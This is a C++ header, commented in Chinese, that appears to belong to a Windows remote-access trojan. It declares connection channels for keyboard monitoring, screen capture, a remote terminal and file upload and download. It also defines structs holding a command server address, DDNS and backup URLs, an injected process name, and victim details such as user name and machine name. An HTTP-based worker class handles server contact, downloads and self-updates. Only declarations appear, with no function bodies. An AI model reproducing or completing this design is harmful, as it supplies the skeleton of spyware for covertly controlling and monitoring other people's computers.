
#pragma once
#include <Wininet.h>
#include <process.h>
#include <stdlib.h>
#include <stdio.h>

#define CONN_MAIN				3000				//控制连接
#define CONN_FILE_MAIN			3001				//主要连接
#define CONN_FRAM				3003				//屏幕连接
#define CONN_FILE_UP			3004				//上传文件
#define CONN_FILE_DL			3005				//下载文件
#define CONN_KEY				3006				//键盘监控
#define CONN_TLNT				3007				//超级终端
#define CONN_FILE_BACK			3008				//后台传输

typedef struct _INITDLLINFO_
{
	WORD m_ServerPort;
	UINT m_ProcessId;
	UINT m_DllFileLen;
	char m_ProcessName[128];
	char m_KeyName[24];
	char m_CtrlFile[128];
	char m_StartFile[128];
	char m_ServerAddr[128];
	char m_ParentFile[256];
	char m_EventName[32];
	char m_DdnsUrl[128];
	char m_BakUrl[128];
	char m_IsUpdate;
	char m_ext[511];
}INITDLLINFO,*LPINITDLLINFO;

typedef struct _LOGININFO_
{
	UINT m_CpuSpeed;			//CPU主频
	UINT m_MemContent;			//内存容量
	char ID[17];				//唯一标识
	char m_PcName[64];			//计算机名称
	char m_SysType;				//操作系统类型
	char m_CpuCount;			//CPU数量
	char m_UserName[38];		//用户名称
}LOGININFO,*LPLOGININFO;

typedef enum tagWin32SysType{
   Windows32s,
   WindowsNT3,
   Windows95,
   Windows98,
   WindowsME,
   WindowsNT4,
   Windows2000,
   WindowsXP,
   Windows2003
}Type;

Type IsShellSysType();

//接口函数
typedef void (* PROCESSTRANS)(HINTERNET , HANDLE , char* , int , char* , char*);

#ifdef _DEBUG
void WriteLog(char* pText);
#endif

BOOL KeyStartMyWork();
void KeyStopMyWork();
	
class SshWork 
{
public:
	BOOL UpdateExeFile();
	SshWork();
	~SshWork();

	INITDLLINFO m_InitInfo;

	HMODULE		hCtrlMd;
	HMODULE		m_Module;
	HANDLE		m_ExitEvent;
	HANDLE		m_Thread;
	HINTERNET	hIe;
	HINTERNET	hFp;
	char		m_IsVideo;

	BOOL GetDesServerInfo(LPINITDLLINFO pInfo, char* pUrl);
	BOOL GetHttpConnect(LPINITDLLINFO pInfo);
	BOOL RecvData(HINTERNET hFile,LPVOID pData,int DataLen);
	void GetMySysInfo(char* pData);

	BOOL DlFile(char* pFileName);

	void BcdToAsc(BYTE *BcdStr , BYTE *AscStr , int BcdStrLen);
	DWORD getCpuSpeedFromRegistry(void);
	char GetVideoInfo();
	void StopWork();
	void StartWork(LPINITDLLINFO pItem);
	void CloseHttpHandle();

	UINT static WINAPI  SSH_WorkThread(LPVOID lPvoid);
};